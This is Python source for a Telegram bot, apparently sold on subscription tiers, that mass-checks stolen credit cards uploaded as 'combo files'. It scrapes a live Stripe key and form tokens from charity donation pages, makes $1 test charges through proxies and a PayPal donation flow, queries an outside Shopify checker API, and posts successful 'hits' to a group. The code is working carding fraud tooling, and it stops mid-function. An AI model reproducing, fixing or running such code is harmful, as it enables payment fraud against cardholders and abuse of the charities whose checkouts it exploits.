# ==============================================================================
# ▰▰▰ THE APEX VIP CHECKER - ENTERPRISE EDITION V3.0 ▰▰▰
# ARCHITECTURE: CYBER-TERMINAL UI | ZERO-LAG | STRICT EXACT PARSING 
# ==============================================================================
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import base64
import logging
import sys
from html import unescape
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import RetryAfter
from telegram.constants import ParseMode

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    get_all_user_proxies, add_proxy_db, remove_proxy_by_index,
    clear_all_proxies, mark_user_joined
)

# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
# ENTERPRISE CONFIGURATION
# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger("APEX_CORE")

BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808").split(",") if x.strip()]

JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "").strip()
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "").strip()
HITS_GROUP_TARGET = os.getenv("HITS_GROUP_ID", "0").strip()

CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

WORKERS = 15  
DELAY = 1.0  
HIT_DELAY = 0.0 # Absolute Zero Lag

_SITE_ERRORS_COUNT = {}
_MAX_SITE_ERRORS = 3
_JOIN_CACHE = {}
_MAINTENANCE_MODE = False

_USER_NAMES = {}
ACTIVE_MTXT_PROCESSES = {}
PENDING_FILES = {}
_system_locks = {}

def get_system_lock(name: str):
    if name not in _system_locks: _system_locks[name] = asyncio.Lock()
    return _system_locks[name]

# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
# LEGENDARY UI ENGINE (PURE, SLEEK, PROFESSIONAL)
# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
def escape_html(text):
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") if text else "Unknown"

async def styled_reply(update: Update, text: str, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    target = update.callback_query.message if update.callback_query else update.message
    if not target: return None
    try: return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except RetryAfter as e:
        await asyncio.sleep(e.retry_after + 0.1)
        return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: return None

async def styled_edit(msg, text, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    try: return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: return None

async def styled_send(bot, chat_id, text, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    try: return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except RetryAfter as e:
        await asyncio.sleep(e.retry_after + 0.1)
        return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: return None

# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
# CORE SYSTEM UTILS & DATABASE
# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
PLANS = {
    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "price": "$5.00"},
    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "price": "$15.00"},
    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 60, "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

async def load_keys():
    async with get_system_lock("keys"):
        if os.path.exists(KEYS_FILE):
            try:
                async with aiofiles.open(KEYS_FILE, 'r', encoding='utf-8') as f: return json.loads(await f.read() or '{}')
            except: pass
        return {}

async def save_keys(keys_data):
    async with get_system_lock("keys"):
        try:
            async with aiofiles.open(KEYS_FILE, 'w', encoding='utf-8') as f: await f.write(json.dumps(keys_data, indent=4))
        except: pass

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 500000
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000
    if "root" in plan_lower: return 5000
    if "elite" in plan_lower: return 3000
    if "core" in plan_lower: return 1000
    return 15

def is_paid_plan(plan): return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

_USER_HTTP_SESSIONS = {}
async def get_user_http_session(uid):
    key = f"{uid}_msp"
    if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
        connector = aiohttp.TCPConnector(limit=WORKERS, ssl=False, force_close=True)
        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=45), connector=connector)
    return _USER_HTTP_SESSIONS[key]

async def cleanup_user_http_session(uid):
    session = _USER_HTTP_SESSIONS.pop(f"{uid}_msp", None)
    if session and not session.closed: await session.close()

def extract_cc(text):
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text or ""):
        y = '20' + y if len(y) == 2 else y
        cards.append(f"{c}|{m}|{y}|{cv}")
    return list(dict.fromkeys(cards))

def parse_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    return f"http://{proxy_str}" if not proxy_str.startswith('http') else proxy_str

def is_dead_site_error(err):
    if not err: return True
    return any(k in str(err).lower() for k in ('receipt id is empty', 'handle is empty', 'product id is empty', 'cloudflare', 'connection failed', 'timed out', 'empty reply from server', 'bad gateway', 'service unavailable', 'gateway timeout', 'site dead', 'proxy dead', 'session_error'))

# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
# EXACT & STRICT API PARSERS (THE APEX FIX)
# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
async def get_bin_info(bin_code):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://bins.antipublic.cc/bins/{bin_code[:6]}", timeout=5) as r:
                if r.status == 200:
                    d = await r.json()
                    return {"brand": d.get("brand", "-"), "type": d.get("type", "-"), "level": d.get("level", "-"), "bank": d.get("bank", "-"), "country": d.get("country_name", "-")}
    except: pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-"}

async def check_stripe_donate_api(card, proxy):
    """APEX STRIPE PARSER: Direct Raw API parsing. ZERO false hits."""
    try:
        parts = card.split('|')
        if len(parts) < 4: return {'status': 'Dead', 'message': 'Invalid Format'}
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        yy_short = yy[-2:]
        email = f'admin.{random.randint(1000,9999)}@gmail.com'
        px = parse_proxy(proxy)
        
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            
            # STEP 1: Secure Token Extraction
            async with local_session.get('https://printsofhope.org/donations/donate-now/', headers={'User-Agent': ua}, proxy=px, timeout=20) as r1:
                html = await r1.text()
            
            pk_match = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
            if not pk_match: return {'status': 'Site Error', 'message': 'Cloudflare/WAF Blocked Proxy'}
            pk = pk_match.group(1)

            # STEP 2: Raw Stripe Penetration
            stripe_url = 'https://api.stripe.com/v1/payment_methods'
            stripe_data = f'type=card&billing_details[name]=Apex+User&billing_details[email]={email}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&key={pk}'
            
            async with local_session.post(stripe_url, headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua}, data=stripe_data, proxy=px, timeout=20) as r2:
                sr = await r2.json()

            # STEP 3: THE ULTIMATE JUDGE (STRICT PARSING)
            if 'error' in sr:
                err = sr['error']
                code = err.get('code', '')
                decline = err.get('decline_code', '')
                msg = err.get('message', '').lower()
                
                # Rule 1: Insufficient Funds
                if code == 'insufficient_funds' or decline == 'insufficient_funds' or 'insufficient' in msg or 'funds' in msg:
                    return {'status': 'Insufficient', 'message': 'insufficient_funds'}
                
                # Rule 2: Approved (Card is live, but data is mismatched)
                if code in ['incorrect_cvc', 'invalid_cvc', 'incorrect_zip'] or decline in ['incorrect_cvc', 'invalid_cvc', 'incorrect_zip']:
                    return {'status': 'Approved', 'message': 'approved'}
                
                # Rule 3: Proxy Block
                if code == 'rate_limit' or r2.status == 429:
                    return {'status': 'Site Error', 'message': 'rate_limit'}
                
                # Rule 4: Absolute Death
                return {'status': 'Dead', 'message': 'card declined'}

            # If Stripe gives an ID, the card is theoretically live. We test it against the merchant.
            pm_id = sr.get('id')
            
            # STEP 4: Merchant Charge
            fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
            fi = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
            nc = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
            
            ajax_data = {
                'give-form-id-prefix': fp, 'give-form-id': fi, 'give-form-hash': nc,
                'give-amount': '1.00', 'payment-mode': 'stripe', 'give_email': email,
                'give_first': 'Apex', 'give_last': 'User', 'give-gateway': 'stripe',
                'action': 'give_process_donation', 'give_stripe_payment_method': pm_id
            }
            async with local_session.post('https://printsofhope.org/wp-admin/admin-ajax.php', data=ajax_data, headers={'user-agent': ua}, proxy=px, timeout=20) as r3:
                try: wp_resp = await r3.json()
                except: return {'status': 'Site Error', 'message': 'Merchant Blocked Execution'}
                
            if wp_resp.get('success') is True or 'donation-confirmation' in str(wp_resp):
                return {'status': 'Charged', 'message': 'Charged'}
                
            error_str = str(wp_resp).lower()
            if 'insufficient' in error_str or 'funds' in error_str: return {'status': 'Insufficient', 'message': 'insufficient_funds'}
            if 'cvc' in error_str or 'zip' in error_str or 'approved' in error_str: return {'status': 'Approved', 'message': 'approved'}
            
            return {'status': 'Dead', 'message': 'card declined'}

    except Exception: return {'status': 'Site Error', 'message': 'Timeout/Proxy Error'}

async def check_paypal_donate_api(card, proxy):
    """APEX PAYPAL PARSER: Exact Mapping."""
    try:
        parts = card.split('|')
        if len(parts) < 4: return {'status': 'Dead', 'message': 'Invalid Format'}
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        yy_short = yy[-2:]
        email = f'apex.{random.randint(1000,9999)}@gmail.com'
        px = parse_proxy(proxy)

        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.DummyCookieJar()) as local_session:
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            
            # STEP 1: Extraction
            async with local_session.get("https://www.callahandogs.com/donate/", headers={'User-Agent': ua}, proxy=px, timeout=20) as r1:
                html = await r1.text()

            token_match = re.search(r'"data-client-token":"(.*?)"', html)
            if not token_match: return {'status': 'Site Error', 'message': 'Cloudflare/WAF Blocked Proxy'}
            
            try:
                dec = base64.b64decode(token_match.group(1)).decode('utf-8')
                au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            except: return {'status': 'Site Error', 'message': 'Auth Token Failed'}

            form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
            form_id_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
            form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)

            ajax_data = {
                'give-form-id-prefix': form_id_prefix, 'give-form-id': form_id, 'give-form-hash': form_hash,
                'give-amount': '1', 'payment-mode': 'paypal-commerce', 'give_email': email,
                'give_first': 'Apex', 'give_last': 'User', 'give-gateway': 'paypal-commerce', 'action': 'give_paypal_commerce_create_order'
            }
            async with local_session.post('https://www.callahandogs.com/wp-admin/admin-ajax.php', data=ajax_data, headers={'User-Agent': ua}, proxy=px, timeout=20) as r2:
                try: idd = (await r2.json())['data']['id']
                except: return {'status': 'Site Error', 'message': 'Order Generation Failed'}

            # STEP 2: PayPal Core Hit
            pp_url = f"https://cors.api.paypal.com/v2/checkout/orders/{idd}/confirm-payment-source"
            pp_payload = {
                "payment_source": {"card": {"number": n, "expiry": f"20{yy_short}-{mm}", "security_code": cvc}}
            }
            pp_headers = {'Content-Type': 'application/json', 'authorization': f'Bearer {au}'}
            
            async with local_session.post(pp_url, json=pp_payload, headers=pp_headers, proxy=px, timeout=20) as r3:
                resp_text = await r3.text()
                
            # STEP 3: STRICT PARSING
            rl = resp_text.lower()
            if r3.status in [200, 201, 202] or 'completed' in rl or 'approved' in rl:
                return {'status': 'Charged', 'message': 'Charged'}
            elif 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
                return {'status': 'Insufficient', 'message': 'insufficient_funds'}
            elif 'cvv' in rl or 'security code' in rl or 'zip' in rl:
                return {'status': 'Approved', 'message': 'approved'}
            elif r3.status == 429 or 'rate_limit' in rl:
                return {'status': 'Site Error', 'message': 'rate_limit'}
            else:
                return {'status': 'Dead', 'message': 'card declined'}

    except Exception: return {'status': 'Site Error', 'message': 'Timeout/Proxy Error'}

async def check_shopify_api(card, site, proxy, session):
    try:
        px = parse_proxy(proxy)
        req_url = f"{CHECKER_API_URL}?cc={card}&site={site}&proxy={px or ''}"
        async with session.get(req_url, timeout=40) as resp:
            if resp.status != 200: return {'status': 'Site Error', 'message': 'Server Unreachable'}
            rj = await resp.json()
            
        rm = str(rj.get('Response', '')).strip().lower()
        st = str(rj.get('Status', '')).strip().lower()
        
        if 'cloudflare' in rm or 'empty' in rm or 'dead' in rm: return {'status': 'Site Error', 'message': 'Gateway Blocked'}
        
        if st == 'true' or 'success' in rm or 'charged' in rm: return {'status': 'Charged', 'message': 'Charged'}
        if 'insufficient' in rm or 'funds' in rm: return {'status': 'Insufficient', 'message': 'insufficient_funds'}
        if 'approved' in rm or 'cvc' in rm or 'zip' in rm: return {'status': 'Approved', 'message': 'approved'}
        return {'status': 'Dead', 'message': 'card declined'}
    except Exception: return {'status': 'Site Error', 'message': 'Connection Error'}

async def check_card_with_retry(card, sites, proxies, session, gateway_name):
    # Maximum 2 attempts. No mercy.
    for _ in range(2):
        p = random.choice(proxies) if proxies else None
        
        if gateway_name == "Stripe":
            r = await check_stripe_donate_api(card, p)
            if r['status'] != 'Site Error': return r
            
        elif gateway_name == "PayPal":
            r = await check_paypal_donate_api(card, p)
            if r['status'] != 'Site Error': return r
            
        else:
            s = random.choice(sites) if sites else ""
            r = await check_shopify_api(card, s, p, session)
            if r['status'] != 'Site Error': return r
            
        await asyncio.sleep(1.0)
    return {'status': 'Dead', 'message': 'card declined'}

# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
# ♛ APEX UI RENDERER (NO UNICODE MESS, JUST ELEGANCE) ♛
# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
def format_card_result(status, card, gateway, response, bin_info, elapsed):
    if status == "Charged": h = f"<blockquote><b>🟢 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 - 𝐂𝐇𝐀𝐑𝐆𝐄𝐃</b></blockquote>"
    elif status == "Approved": h = f"<blockquote><b>✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 - 𝐂𝐕𝐕</b></blockquote>"
    elif status == "Insufficient": h = f"<blockquote><b>🟡 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 - 𝐈𝐍𝐒𝐔𝐅𝐅𝐈𝐂𝐈𝐄𝐍𝐓</b></blockquote>"
    else: h = f"<blockquote><b>🔴 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃</b></blockquote>"
    
    return f"""{h}
<b>[↯] 𝐂𝐚𝐫𝐝:</b> <code>{card}</code>
<b>[⚡] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <code>{response}</code>

<b>[⚙️] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> <code>{gateway}</code>
<b>[🏦] 𝐁𝐚𝐧𝐤 𝐈𝐧𝐟𝐨:</b>
 ├ <b>𝐈𝐧𝐬𝐭𝐢𝐭𝐮𝐭𝐢𝐨𝐧:</b> <code>{bin_info.get('bank', '-')}</code>
 ├ <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> <code>{bin_info.get('country', '-')}</code>
 ╰ <b>𝐁𝐫𝐚𝐧𝐝/𝐓𝐲𝐩𝐞:</b> <code>{bin_info.get('brand', '-')} - {bin_info.get('type', '-')}</code>

<b>[⏱] 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧:</b> <code>{elapsed:.2f}s</code>"""

async def _send_global_hit(status, gateway, message, uid, bot, elapsed):
    if not HITS_GROUP_TARGET or status not in ["Charged", "Insufficient", "Approved"]: return
    try:
        safe_name = escape_html(_USER_NAMES.get(uid, f"User {uid}"))
        plan = await get_user_plan(uid)
        
        if status == "Charged": h = f"<blockquote><b>🟢 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘</b></blockquote>"
        elif status == "Approved": h = f"<blockquote><b>✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐕𝐕</b></blockquote>"
        else: h = f"<blockquote><b>🟡 𝐈𝐍𝐒𝐔𝐅𝐅𝐈𝐂𝐈𝐄𝐍𝐓 𝐅𝐔𝐍𝐃𝐒</b></blockquote>"
        
        text = f"""{h}
<b>[🚀] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲:</b> <code>{gateway}</code>
<b>[🔥] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> <code>{message}</code>
<b>[⏱] 𝐓𝐨𝐨𝐤:</b> <code>{elapsed:.2f}s</code>
<b>[👤] 𝐇𝐮𝐧𝐭𝐞𝐫:</b> <a href="tg://user?id={uid}">{safe_name}</a> (<code>{plan.title() if plan else 'Free'}</code>)"""
        
        try: cid = int(HITS_GROUP_TARGET)
        except: cid = HITS_GROUP_TARGET
        await bot.send_message(chat_id=cid, text=text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: pass

# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
# ♛ CORE COMMAND ROUTER & MENUS ♛
# ▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
async def is_user_joined(uid, bot):
    targets = [t for t in [JOIN_CHANNEL_TARGET, JOIN_GROUP_TARGET] if t]
    if not targets: return True
    for target in targets:
        try:
            member = await bot.get_chat_member(chat_id=target, user_id=uid)
            if member.status in ['left', 'kicked', 'banned']: return False
        except Exception: pass 
    return True

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_ID: return True
    now = time.time()
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    
    is_joined = await is_user_joined(uid, context.bot)
    if is_joined:
        _JOIN_CACHE[uid] = now
        return True
        
    kb = []
    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton("Channel", url=JOIN_CHANNEL_LINK, style="primary")])
    if not kb: return True
    kb.append([InlineKeyboardButton("Verify", callback_data="check_joined", style="success")])
    
    await styled_reply(update, f"<blockquote><b>🔴 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝</b></blockquote>\n\n<b>[!]</b> You must join the official channels to access the Apex Engine.", buttons=kb)
    return False

async def send_welcome_menu(update_or_bot, uid, plan, limit):
    admin_panel = f"\n\n<b>[⚙️] 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥:</b>\n ├ /gen [plan] [qty] - Generate Keys\n ├ /validate [key] - Audit Key\n ├ /users - System Metrics\n ╰ /maint - Toggle Maint Mode" if uid in ADMIN_ID else ""
    t = f"""<blockquote><b>♛ 𝐀𝐏𝐄𝐗 𝐄𝐍𝐓𝐄𝐑𝐏𝐑𝐈𝐒𝐄 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ♛</b></blockquote>

<b>[🚀] 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐄𝐧𝐠𝐢𝐧𝐞:</b>
 ╰ <i>Drop your combo file to initiate mass checking.</i>

<b>[🛡] 𝐏𝐫𝐨𝐱𝐲 𝐅𝐢𝐫𝐞𝐰𝐚𝐥𝐥:</b>
 ├ /addpxy - Inject Proxies
 ├ /proxy - Audit Proxies
 ╰ /rmpxy - Flush Proxies

<b>[👤] 𝐈𝐝𝐞𝐧𝐭𝐢𝐭𝐲 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭:</b>
 ├ /info - Profile Metrics
 ├ /redeem - Claim Access
 ╰ /plan - Subscription Tiers{admin_panel}

<b>[💳] 𝐀𝐜𝐭𝐢𝐯𝐞 𝐓𝐢𝐞𝐫:</b> <code>{plan.title() if plan else 'Free'} ({limit} CC/Task)</code>"""
    
    kb = [[InlineKeyboardButton("View Subscriptions", callback_data="show_plans", style="primary")]]
    if isinstance(update_or_bot, Update): await styled_reply(update_or_bot, t, buttons=kb)
    else: await styled_send(update_or_bot, uid, t, buttons=kb)

async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    uid = update.effective_user.id
    pm = await styled_reply(update, f"<blockquote><b>⏱ 𝐀𝐧𝐚𝐥𝐲𝐳𝐢𝐧𝐠 𝐏𝐚𝐲𝐥𝐨𝐚𝐝...</b></blockquote>")
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): 
            return await styled_edit(pm, f"<blockquote><b>🔴 𝐀𝐜𝐭𝐢𝐯𝐞 𝐄𝐧𝐠𝐢𝐧𝐞 𝐑𝐮𝐧𝐧𝐢𝐧𝐠</b></blockquote>\nStop prior task before executing new deployment.")
        
        doc = update.message.document
        if doc.file_size > 3 * 1024 * 1024: return await styled_edit(pm, f"<blockquote><b>🔴 𝐏𝐚𝐲𝐥𝐨𝐚𝐝 𝐄𝐱𝐜𝐞𝐞𝐝𝐬 𝐋𝐢𝐦𝐢𝐭𝐬 (𝐌𝐚𝐱 𝟑𝐌𝐁)</b></blockquote>")
        
        db_proxies = await get_all_user_proxies(uid)
        if not db_proxies: return await styled_edit(pm, f"<blockquote><b>🔴 𝐏𝐫𝐨𝐱𝐲 𝐅𝐢𝐫𝐞𝐰𝐚𝐥𝐥 𝐄𝐦𝐩𝐭𝐲</b></blockquote>\nPopulate via /addpxy.")
        
        f = await context.bot.get_file(doc.file_id)
        fp = f"temp_{uid}_{int(time.time())}.txt"
        await f.download_to_drive(fp)
        
        try:
            async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: content = await file.read()
        except:
            async with aiofiles.open(fp, "r", encoding="latin-1", errors="ignore") as file: content = await file.read()
        if os.path.exists(fp): os.remove(fp)
        
        cards = extract_cc(content)
        if not cards: return await styled_edit(pm, f"<blockquote><b>🔴 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐂𝐫𝐞𝐝𝐞𝐧𝐭𝐢𝐚𝐥𝐬 𝐃𝐞𝐭𝐞𝐜𝐭𝐞𝐝</b></blockquote>")
        
        cl = get_cc_limit(await get_user_plan(uid), uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        
        kb = [
            [InlineKeyboardButton("Shopify Mass", callback_data="gate:Shopify", style="success"), InlineKeyboardButton("Stripe API (1$)", callback_data="gate:Stripe", style="success")],
            [InlineKeyboardButton("PayPal API (1$)", callback_data="gate:PayPal", style="primary"), InlineKeyboardButton("Cancel", callback_data="gate:cancel", style="danger")]
        ]
        await styled_edit(pm, f"<blockquote><b>✅ 𝐏𝐚𝐲𝐥𝐨𝐚𝐝 𝐒𝐞𝐜𝐮𝐫𝐞𝐝</b></blockquote>\n\n<b>[⚙️] 𝐕𝐚𝐥𝐢𝐝 𝐂𝐂𝐬:</b> <code>{len(cards)}</code>\n<b>[🚀] 𝐒𝐞𝐥𝐞𝐜𝐭 𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐕𝐞𝐜𝐭𝐨𝐫:</b>", buttons=kb)
    except Exception as e: await styled_edit(pm, f"<blockquote><b>🔴 𝐒𝐲𝐬𝐭𝐞𝐦 𝐄𝐫𝐫𝐨𝐫</b></blockquote>\n{str(e)[:50]}")

async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    uid = update.effective_user.id
    USER_LAST_REQ[uid] = time.time()
    _USER_NAMES[uid] = update.effective_user.first_name or str(uid)
    
    raw_text = update.message.text or update.message.caption or ""
    if not re.match(r'^[/.][a-zA-Z0-9]', raw_text):
        if update.message.document and (update.message.document.mime_type.startswith('text/') or update.message.document.file_name.endswith('.txt')):
            await auto_file_check_cmd(update, context)
        return

    tokens = raw_text.split()
    cmd = tokens[0][1:].lower().split('@')[0] 
    args = tokens[1:]

    if cmd in ["start", "cmds", "commands"]:
        if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await styled_reply(update, f"<blockquote><b>⚙️ 𝐒𝐲𝐬𝐭𝐞𝐦 𝐔𝐧𝐝𝐞𝐫 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞</b></blockquote>")
        if not await force_join_check(update, context): return
        await ensure_user(uid)
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(update, uid, plan, limit)

    elif cmd == "info":
        plan = await get_user_plan(uid)
        t = f"<blockquote><b>👤 𝐏𝐫𝐨𝐟𝐢𝐥𝐞 𝐌𝐞𝐭𝐫𝐢𝐜𝐬</b></blockquote>\n\n<b>[+] 𝐈𝐃:</b> <code>{uid}</code>\n<b>[+] 𝐒𝐭𝐚𝐭𝐮𝐬:</b> <code>{'Active' if is_paid_plan(plan) else 'Free'}</code>\n<b>[+] 𝐏𝐥𝐚𝐧:</b> <code>{plan.title() if plan else 'Bronze'}</code>\n<b>[+] 𝐋𝐢𝐦𝐢𝐭:</b> <code>{get_cc_limit(plan, uid)} CCs</code>"
        await styled_reply(update, t)

    elif cmd == "addpxy":
        lines = []
        if update.message.reply_to_message:
            if update.message.reply_to_message.document:
                f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
                fp = f"px_{uid}.txt"
                await f.download_to_drive(fp)
                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file: lines = (await file.read()).split()
                os.remove(fp)
            else: lines = (update.message.reply_to_message.text or "").split()
        else:
            if len(tokens) > 1: lines = args
            else: return await styled_reply(update, f"<blockquote><b>🔴 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐏𝐫𝐨𝐱𝐲 𝐋𝐢𝐬𝐭</b></blockquote>")
        
        db_p = await get_all_user_proxies(uid)
        eu = {p['proxy_url'] for p in db_p} if db_p else set()
        parsed = [px for l in lines if (px := parse_proxy(l)) and px not in eu]
        if not parsed: return await styled_reply(update, f"<blockquote><b>🔴 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐏𝐫𝐨𝐱𝐢𝐞𝐬 𝐈𝐝𝐞𝐧𝐭𝐢𝐟𝐢𝐞𝐝</b></blockquote>")
        
        for p2 in parsed[:100]:
            # Convert simple string to dict format for DB compatibility
            p_dict = {'ip': p2.split('//')[-1].split(':')[0], 'port': p2.split(':')[-1], 'proxy_url': p2}
            await add_proxy_db(uid, p_dict)
            
